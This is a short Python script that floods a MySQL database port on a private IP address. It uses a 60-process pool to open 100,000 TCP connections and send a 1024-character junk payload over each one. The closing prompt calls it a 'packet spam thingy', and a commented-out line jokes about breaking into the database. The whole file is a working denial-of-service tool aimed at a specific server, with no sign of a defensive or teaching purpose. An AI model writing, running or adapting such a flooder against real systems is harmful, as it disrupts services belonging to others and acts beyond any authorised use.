
import socket
import multiprocessing
import numpy as np
from functools import partial
import os


def send(iterator,port,ip,payload):
    global validports
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            
            s.connect((ip, port))
            s.sendall(payload)
            print("data might be sent through "+ str(port) + " by process " + str(os.getpid()))
        except:
            print("process " + str(os.getpid()) + " tried to do stuff with port"+ str(port) + ", but failed")



if __name__ == "__main__":
    validports = []
    #rawPayload = "hi sir please allow me to enter this ass queue ell data base pwease uwu"
    rawPayload = "￿"*1024
    payload = bytes(rawPayload,'utf-8')
    #rawInput = input("input data to send: ")
    poolSize = 60
    pool = multiprocessing.Pool(processes = poolSize)

    HOST = '10.7.180.19'
    PORT = 3306
    times = 100000
    iterator = np.array([None]*times)
    checkport_part = partial(send, ip = HOST, payload = payload, port = PORT)
    pool.map(checkport_part,iterator)
    input("packet spam thingy is done")


    #outdata = bytes(rawInput,'utf-8')